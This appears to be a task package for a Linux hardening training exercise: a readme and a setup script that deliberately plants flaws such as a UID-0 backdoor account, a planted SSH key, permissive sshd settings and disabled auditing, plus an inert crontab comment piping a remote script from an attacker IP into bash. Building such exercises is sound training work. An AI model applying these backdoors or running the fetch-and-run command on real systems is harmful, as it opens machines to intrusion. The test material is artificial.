title: Week 1 Advanced: Accounts (Linux)
readme:
You administer this Linux workstation (modeled on a real competition image). A security review found many problems across accounts, policy, the kernel, services, persistence, and more. Harden the machine WITHOUT breaking what the company needs.

Authorized users: winston, julia, charrington (julia is an ordinary user, not an admin).

Two services must stay working AND be secured: the SSH remote-login service (an authorized user must still be able to log in; root must not, and empty passwords must be refused) and an internal web status page on port 8099 (must run, but listen on localhost only). Both have been left stopped — bring them back.

There are also forensics questions — click "Forensics…" to answer them.

Removing an authorized user is a penalty.
setup:
set -e
export DEBIAN_FRONTEND=noninteractive
apt-get update -qq >/dev/null 2>&1 || true
apt-get install -y -q openssh-server auditd john acl >/dev/null 2>&1 || true
pw() { printf '%s' "$(tr -dc 'A-Za-z0-9' </dev/urandom | head -c 14)Aa1!"; }

# authorized users
for u in winston julia charrington; do
    id "$u" >/dev/null 2>&1 || useradd -m -s /bin/bash "$u"
    echo "$u:$(pw)" | chpasswd
done

# ---- users / groups vulns ----
id aaronson   >/dev/null 2>&1 || useradd -M aaronson
id goldstein  >/dev/null 2>&1 || useradd -M -u 1984 goldstein
id goldstein1 >/dev/null 2>&1 || useradd -o -u 0 -g 0 -M goldstein1
usermod -aG sudo julia                                  # julia wrongly an admin
getent group suspects >/dev/null || groupadd suspects   # winston should be in suspects, isn't
gpasswd -d winston suspects >/dev/null 2>&1 || true
sed -i 's/^root:[^:]*:/root:$6$ptcomp$abcdefghij:/' /etc/gshadow   # group password on root group

# ---- account policy ----
sed -i 's/^PASS_MIN_DAYS.*/PASS_MIN_DAYS\t0/' /etc/login.defs
grep -q '^PASS_MIN_DAYS' /etc/login.defs || printf 'PASS_MIN_DAYS\t0\n' >> /etc/login.defs
usermod -p "$(openssl passwd -6 Winston1984Aa1! 2>/dev/null || echo '$6$x$y')" root   # root unlocked

# ---- kernel sysctl (wrong values) ----
cat > /etc/sysctl.d/99-ptcomp.conf <<SYS
kernel.kptr_restrict = 0
net.ipv4.icmp_echo_ignore_broadcasts = 0
kernel.dmesg_restrict = 0
net.ipv4.tcp_syncookies = 0
kernel.randomize_va_space = 0
net.ipv4.ip_forward = 1
SYS
sysctl --system >/dev/null 2>&1 || true

# ---- firewall off / auditd off / prohibited tool present (john, installed above) ----
ufw --force disable >/dev/null 2>&1 || true
systemctl disable --now auditd >/dev/null 2>&1 || true

# ---- prohibited file: winston's disguised diary ----
install -d -o winston -g winston /home/winston/.linuxmint/mintwelcome
printf 'DOWN WITH BIG BROTHER\n' > /home/winston/.linuxmint/mintwelcome/norun.flag
chown winston:winston /home/winston/.linuxmint/mintwelcome/norun.flag

# ---- persistence (all inert markers: they run /bin/true, not the attacker command) ----
printf '* * * * * root /bin/true # curl -s http://172.16.164.1:8000/x | bash\n' >> /etc/crontab
printf '#!/bin/sh\n: inert\n' > /bin/goose; chmod +x /bin/goose
grep -q "alias ls='/bin/goose'" /etc/bash.bashrc || printf "alias ls='/bin/goose'\n" >> /etc/bash.bashrc
printf '#!/bin/sh\n: inert\n' > /root/downwithbigbrother.sh; chmod +x /root/downwithbigbrother.sh
printf '* * * * * root /bin/true # /root/downwithbigbrother.sh\n' >> /etc/crontab

# ---- ssh: a malicious extra key planted for julia ----
install -d -o julia -g julia -m 700 /home/julia/.ssh
printf 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAtt4ckerPlaceholderKeyDoNotUse attacker\n' > /home/julia/.ssh/authorized_keys
chown julia:julia /home/julia/.ssh/authorized_keys
chmod 600 /home/julia/.ssh/authorized_keys

# ---- updates: automatic upgrades turned off ----
printf 'APT::Periodic::Update-Package-Lists "0";\nAPT::Periodic::Unattended-Upgrade "0";\n' > /etc/apt/apt.conf.d/20auto-upgrades

# ---- a malicious ACL on sudo ----
setfacl -m u:1984:rwx /usr/bin/sudo >/dev/null 2>&1 || true

# ---- forensics artifacts ----
install -d /var/log
printf 'Failed password for invalid user root from 172.16.164.1 port 4444 ssh2\nFailed password for winston from 172.16.164.1 port 4445 ssh2\n' >> /var/log/auth.log 2>/dev/null || true
install -d -o winston -g winston /home/winston/Desktop
printf 'calclog (each letter is a digit): RED + RED + QUARK = STORK -> decode to a number\n' > /home/winston/Desktop/calclog.txt
chown winston:winston /home/winston/Desktop/calclog.txt

# ==== service 1: SSH (keep it running + hardened; winston is the authorized login) ====
install -d -m 755 /opt/ptcheck
rm -f /opt/ptcheck/winston_id /opt/ptcheck/winston_id.pub
ssh-keygen -t ed25519 -N '' -q -f /opt/ptcheck/winston_id
chmod 600 /opt/ptcheck/winston_id
install -d -m 700 -o winston -g winston /home/winston/.ssh
cp /opt/ptcheck/winston_id.pub /home/winston/.ssh/authorized_keys
chown winston:winston /home/winston/.ssh/authorized_keys
chmod 600 /home/winston/.ssh/authorized_keys
printf 'PT-SSH-OK-7F3A\n' > /home/winston/sentinel.txt
chown winston:winston /home/winston/sentinel.txt
install -d -m 755 /etc/ssh/sshd_config.d
printf 'PermitRootLogin yes\nPermitEmptyPasswords yes\n' > /etc/ssh/sshd_config.d/99-ptcomp.conf
systemctl disable --now ssh >/dev/null 2>&1 || systemctl disable --now sshd >/dev/null 2>&1 || true

# ==== service 2: internal web (left stopped + exposed on 0.0.0.0) ====
id ptweb >/dev/null 2>&1 || useradd -r -s /usr/sbin/nologin ptweb
install -d -m 755 /srv/ptweb
printf 'PT-WEB-OK-5B2C\n' > /srv/ptweb/sentinel.txt
chmod 644 /srv/ptweb/sentinel.txt
cat > /etc/systemd/system/ptweb.service <<UNIT
[Unit]
Description=PT Comp internal status web service
After=network.target
[Service]
User=ptweb
ExecStart=/usr/bin/python3 -m http.server 8099 --bind 0.0.0.0 --directory /srv/ptweb
Restart=no
[Install]
WantedBy=multi-user.target
UNIT
systemctl daemon-reload >/dev/null 2>&1 || true
systemctl disable --now ptweb >/dev/null 2>&1 || true
true
